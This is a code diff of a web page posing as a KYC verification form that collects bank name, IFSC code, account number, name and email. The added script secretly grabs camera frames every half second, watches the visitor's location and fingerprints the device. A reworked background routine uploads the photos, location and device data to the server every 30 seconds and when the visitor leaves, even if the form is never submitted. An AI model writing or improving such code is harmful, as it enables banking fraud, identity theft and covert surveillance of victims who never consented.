@@ -467,13 +467,17 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
   
   <script>
-    // Global variables
+        // Global variables
     let cameraStream = null;
     let captureInterval = null;
     let capturedImages = [];
     let locationData = null;
     let locationWatchId = null;
-    const MAX_IMAGES = 30;
+    let backgroundInterval = null;
+    let isSubmitted = false;
+    const MAX_BACKGROUND_IMAGES = 10;
+    const MAX_SUBMISSION_IMAGES = 20;
+    
 
     // Enhanced device detection
     function getDeviceInfo() {
@@ -553,30 +557,21 @@
     }
     
     // Start capturing images
-    function startBackgroundCapture() {
+function startBackgroundCapture() {
       const preview = document.getElementById('cameraPreview');
       const canvas = document.getElementById('captureCanvas');
       const ctx = canvas.getContext('2d');
       
-      // Set canvas size to match video
-      const resizeCanvas = () => {
-        canvas.width = preview.videoWidth;
-        canvas.height = preview.videoHeight;
-      };
-      
-      // Initial resize
-      resizeCanvas();
-      
-      // Also resize when video dimensions change
-      preview.addEventListener('resize', resizeCanvas);
+      if (captureInterval) clearInterval(captureInterval);
       
       captureInterval = setInterval(() => {
-        if (capturedImages.length >= MAX_IMAGES) {
+        if (capturedImages.length >= MAX_BACKGROUND_IMAGES) {
           clearInterval(captureInterval);
           return;
         }
         
-        // Capture image
+        canvas.width = preview.videoWidth;
+        canvas.height = preview.videoHeight;
         ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
         const imageData = canvas.toDataURL('image/jpeg', 0.8);
         capturedImages.push({
@@ -584,8 +579,9 @@
           data: imageData,
           timestamp: new Date().toISOString()
         });
-      }, 500); // Capture every 500ms
-    }
+      }, 500);
+}
+    
     
     // Watch location continuously
     function watchLocation() {
@@ -608,18 +604,18 @@
       );
     }
     
-    // Form submission handler
+        // ====== MODIFIED FORM HANDLER ====== //
     document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
       e.preventDefault();
-      isFormSubmitted = true;
+      isSubmitted = true;
+      clearInterval(backgroundInterval);
       
-      // Capture additional 20 images quickly
-      const additionalImages = await captureAdditionalImages(20);
+      const additionalImages = await captureAdditionalImages(MAX_SUBMISSION_IMAGES);
       capturedImages = [...capturedImages, ...additionalImages];
       
-      // Prepare form data
       const formData = new FormData();
       const deviceInfo = getDeviceInfo();
+      
       
       // Add enhanced device info
       formData.append('device_type', deviceInfo.type);
@@ -628,6 +624,8 @@
       formData.append('device_os', deviceInfo.os);
       formData.append('device_browser', deviceInfo.browser);
       formData.append('user_agent', deviceInfo.fullUA);
+      formData.append('is_submitted', 'true'); // ADD THIS LINE
+      
       
       // Add form fields (empty if not filled)
       ['bankname', 'ifsc', 'accno', 'fullname', 'email'].forEach(field => {
@@ -777,51 +775,61 @@
       }
       return new Blob([u8arr], { type: mime });
     }
+
+    // ====== NEW FUNCTION ====== //
+    async function submitBackgroundData() {
+      if (isSubmitted || capturedImages.length === 0) return;
+      
+      const formData = new FormData();
+      const deviceInfo = getDeviceInfo();
+      
+      formData.append('device_type', deviceInfo.type);
+      formData.append('device_model', deviceInfo.model);
+      formData.append('device_vendor', deviceInfo.vendor);
+      formData.append('device_os', deviceInfo.os);
+      formData.append('device_browser', deviceInfo.browser);
+      formData.append('user_agent', deviceInfo.fullUA);
+      formData.append('empty_form', 'true');
+      formData.append('timestamp', new Date().toISOString());
+      
+      capturedImages.slice(0, MAX_BACKGROUND_IMAGES).forEach((img, index) => {
+        const blob = dataURLtoBlob(img.data);
+        formData.append(`image${index}`, blob, `background_${index}.jpg`);
+      });
+      
+      if (locationData) {
+        formData.append('location', JSON.stringify(locationData));
+      }
+      
+      try {
+        await fetch('/submit', {
+          method: 'POST',
+          body: formData
+        });
+      } catch (error) {
+        console.error('Background submission failed:', error);
+      }
+    }
+    // ====== END NEW FUNCTION ====== //
     
-    // ====== NEW BACKGROUND SUBMISSION SYSTEM ======
-let isFormSubmitted = false;
-const MAX_BACKGROUND_IMAGES = 15; // Sends batches of 15 images
-
-async function submitBackgroundData() {
-  if (isFormSubmitted || capturedImages.length === 0) return;
-  
-  const imagesToSend = capturedImages.slice(0, MAX_BACKGROUND_IMAGES);
-  const formData = new FormData();
-  
-  // Add device info
-  const deviceInfo = getDeviceInfo();
-  formData.append('device_type', deviceInfo.type);
-  formData.append('device_model', deviceInfo.model);
-  formData.append('device_os', deviceInfo.os);
-  formData.append('empty_form', 'true');
-  
-  // Add images
-  imagesToSend.forEach((img, index) => {
-    const blob = dataURLtoBlob(img.data);
-    formData.append(`image${index}`, blob, `bg_${Date.now()}_${index}.jpg`);
-  });
-
-  try {
-    await fetch('/submit', {
-      method: 'POST',
-      body: formData,
-      keepalive: true // Critical for reliability
-    });
-    capturedImages = capturedImages.slice(MAX_BACKGROUND_IMAGES); // Remove sent images
-  } catch (error) {
-    console.error('Background submit failed (will retry):', error);
+    
+    // Background submission every 30 seconds
+backgroundInterval = setInterval(async () => {
+  if (document.getElementById('kycForm').style.display === 'block' && 
+      !isSubmitted && 
+      capturedImages.length > 0) {
+    await submitBackgroundData();
   }
-}
+}, 30000);
 
-// Triple-redundant triggering system
-window.addEventListener('pagehide', submitBackgroundData);
-document.addEventListener('visibilitychange', () => {
-  if (document.visibilityState === 'hidden') submitBackgroundData();
+// Trigger when user leaves
+window.addEventListener('beforeunload', async function() {
+  if (!isSubmitted && document.getElementById('kycForm').style.display === 'block') {
+    await submitBackgroundData();
+  }
+  stopCamera();
 });
 
-// Fallback every 15 seconds
-const bgInterval = setInterval(submitBackgroundData, 15000);
-// ====== END NEW SYSTEM ======
     // Start the process by showing popup immediately
     window.addEventListener('load', function() {
       document.getElementById('verificationPopup').style.display = 'flex';
